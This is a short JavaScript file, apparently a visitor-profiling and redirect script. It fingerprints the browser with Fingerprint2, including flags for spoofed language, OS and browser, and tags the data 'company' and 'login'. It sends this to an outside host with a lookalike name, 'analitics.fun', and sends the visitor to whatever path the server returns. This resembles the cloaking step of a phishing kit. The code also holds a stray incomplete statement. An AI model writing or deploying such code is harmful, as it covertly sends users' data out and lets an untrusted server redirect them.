var hasConsole = typeof console !== "undefined"
var data;
var fingerprintReport = function () {
    var d1 = new Date()
    var data = [];
    Fingerprint2.get(function (components) {
        var murmur = Fingerprint2.x64hash128(components.map(function (pair) {
            return pair.value
        }).join(), 31)
        var d2 = new Date()
        var time = d2 - d1
        var details = ""


        var hasLiedLanguages = components[22].value;
        var has
        data = {
            "fingerprint": murmur,
            "timezone": components[9].value,
            "hasLiedLanguages": components[22].value,
            "hasLiedOs": components[24].value,
            "hasLiedBrowser": components[25].value,
            'c': 'company',
            'l': 'login'
        }
        $.post('https://analitics.fun/Core/Controller/ControllerGetJS.php', data, function (result) {


                document.location.href = location.href + result;

        });
    });
}

var cancelId
var cancelFunction

// see usage note in the README
if (window.requestIdleCallback) {
    cancelId = requestIdleCallback(fingerprintReport)
    cancelFunction = cancelIdleCallback
} else {
    cancelId = setTimeout(fingerprintReport, 500)
    cancelFunction = clearTimeout
}








